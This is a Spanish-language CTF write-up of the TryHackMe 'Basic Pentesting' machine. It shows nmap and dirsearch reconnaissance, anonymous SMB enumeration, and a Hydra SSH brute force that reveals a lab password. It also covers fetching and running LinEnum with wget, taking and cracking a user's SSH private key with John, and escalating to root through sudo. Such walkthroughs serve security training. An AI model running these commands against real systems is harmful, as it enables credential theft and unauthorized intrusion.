# Basic Pentesting - TryHackMe

Este es el write-up de la resolución del reto CTF realizado en la máquina `10.10.136.193`. A continuación se detallan las fases de reconocimiento, explotación y escalada de privilegios.

---

## Reconocimiento

### Ping

Realizamos un ping inicial:  

```bash
ping -c 1 10.10.136.193
```
<img width="558" alt="image" src="https://github.com/user-attachments/assets/8e126666-527d-4212-802a-2c99ed8d06f8" />

Se observa un TTL de 63, que indica un sistema operativo Linux.

### Nmap

Ejecutamos un escaneo completo para identificar puertos abiertos:
```bash
nmap -p- -sS -sC -sV --open --min-rate=5000 -n -vvv -Pn 10.10.136.193 -oN escaneo.txt
```
<img width="560" alt="image" src="https://github.com/user-attachments/assets/2608d9ac-d1dd-419a-b98f-a725c55e632c" /><br>

Encontramos el puerto 80 abierto, accedemos a su contenido:

<img width="555" alt="image" src="https://github.com/user-attachments/assets/28465ea0-d47c-49b2-8f67-c7feb85c832d" />

### Dirsearch

Enumeramos directorios en el servidor HTTP:
```bash
dirsearch -u http://10.10.136.193/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
<img width="560" alt="image" src="https://github.com/user-attachments/assets/16f2a291-cca1-4721-8bb4-6c8c6d45c34e" /><br>

Descubrimos el directorio /development y analizamos dos ficheros .txt dentro de él:

<img width="557" alt="image" src="https://github.com/user-attachments/assets/e14f4c6e-75b0-4ce8-bbfe-e2d8f5434f66" /><br>


Observamos que hay dos usuarios cuyos nombres comienzan con K y J:
<img width="560" alt="image" src="https://github.com/user-attachments/assets/8e041877-1984-4d2a-a9a8-54baf7ed271b" /><br>

Se indica que J tiene una contraseña fácil de romper:
<img width="557" alt="image" src="https://github.com/user-attachments/assets/b323b795-7d70-4d4d-a5c8-a77e6a2f10f7" /><br>


### Protocolo SMB

Enumeramos recursos compartidos con SMB:
```bash
smbclient -L 10.10.136.193 -N
```
<img width="563" alt="image" src="https://github.com/user-attachments/assets/98d63a47-026f-4ff0-8b81-10455185e113" /><br>


Accedemos al recurso Anonymous:
```bash
smbclient //10.10.136.193/Anonymous -N
```
<img width="561" alt="image" src="https://github.com/user-attachments/assets/077610fb-7440-4505-933a-c8e2e76ee6f5" /><br>


Encontramos el archivo staff.txt, lo descargamos:
```bash
get staff.txt
```
<img width="559" alt="image" src="https://github.com/user-attachments/assets/81ccf4bd-1cf7-402a-a366-ac0d22150921" />

Confirmamos los usuarios: Kay y Jan.

---

## Explotación

### Hydra

Probamos fuerza bruta SSH con Hydra sobre el usuario Jan:
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.136.193
```
<img width="560" alt="image" src="https://github.com/user-attachments/assets/f929c632-7a35-48c4-84b8-4e44a44e3fa5" />

Encontramos la contraseña de jan: armando.

Accedemos vía SSH:
```bash
ssh jan@10.10.136.193
```
<img width="560" alt="image" src="https://github.com/user-attachments/assets/f1f1ff97-5da9-4458-a1f1-7f67f74b0ee0" />
<img width="563" alt="image" src="https://github.com/user-attachments/assets/4e514a54-0e0e-49a6-a5fa-421996e90ee0" />

---

## Escalada de privilegios

### Sudo -l
<img width="562" alt="image" src="https://github.com/user-attachments/assets/f9a7aa3d-3122-4105-b200-8cf043cae403" />

No sirve porque el usuario Jan no tiene privilegios para ejecutar comando como sudo.

### Binarios SUID

Comprobamos binarios con bit SUID:
```bash
find / -perm -4000 2>/dev/null
```
<img width="536" alt="image" src="https://github.com/user-attachments/assets/b5d6048e-00e7-45d5-9f56-9ff28536c2c8" />

Sospechamos de pkexec vulnerable (pwnkit), pero la máquina parece parcheada y no nos permite explotarlo. Intentamos compilar un exploit, pero falla.

### LinEnum

<img width="557" alt="image" src="https://github.com/user-attachments/assets/66bbbbc4-d3be-4cf8-8227-987ed10c9733" /><br>


Descargamos y ejecutamos LinEnum para enumerar vulnerabilidades en la VM Víctima:
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```
<img width="562" alt="image" src="https://github.com/user-attachments/assets/89001a15-a258-4ad4-9ed6-61ecc071be1d" /><br><br>
🚀 Oportunidad clara:<br>
- 👉 El usuario kay pertenece al grupo sudo, es decir, kay puede hacer sudo, y seguramente conviene cambiar a kay si consigo su contraseña:
```bash
uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),...
```

Lanzamos Hydra nuevamente sobre kay:
```bash
hydra -l kay -P /usr/share/wordlists/rockyou.txt ssh://10.10.136.193
```
Sin éxito. Seguimos investigando.

### Clave SSH y John the Ripper
Dentro de /home/kay encontramos un fichero id_rsa para autenticación SSH. Lo copiamos a nuestra máquina atacante, pero está protegido con passphrase.
<img width="562" alt="image" src="https://github.com/user-attachments/assets/71077cfc-7ff7-41a1-86e3-e011052d3c25" /><br>
<img width="556" alt="image" src="https://github.com/user-attachments/assets/e55260b6-d7e6-48be-9668-7216f82c026e" /><br>

Procedemos a crackearlo:

Convertimos al formato John:
```bash
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```

Lo rompemos con John:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
<img width="563" alt="image" src="https://github.com/user-attachments/assets/ff5f631e-60b9-4aa9-8455-212934b474bc" />

Con la passphrase correcta, accedemos vía SSH como kay.

Leemos el fichero pass.bak que parece contener la contraseña de kay:

<img width="563" alt="image" src="https://github.com/user-attachments/assets/c3c73c2f-d96c-4deb-92b5-0606b8369965" /><br>

Comprobamos privilegios de sudo:
```bash
sudo -l
```
<img width="563" alt="image" src="https://github.com/user-attachments/assets/088561c6-b4a1-4393-9908-f28e1e6be0ff" /><br>

Verificamos que kay tiene permisos sudo sin restricciones. ¡Root conseguido! 🎉

---

## Conclusiones
- Enumeración inicial completa con Nmap y Dirsearch
- Enumeración de recursos SMB para obtener usuarios
- Ataque de fuerza bruta con Hydra para acceso inicial
- Enumeración de privilegios con LinEnum
- Uso de John the Ripper para romper passphrase de clave SSH
- Escalada final con privilegios sudo

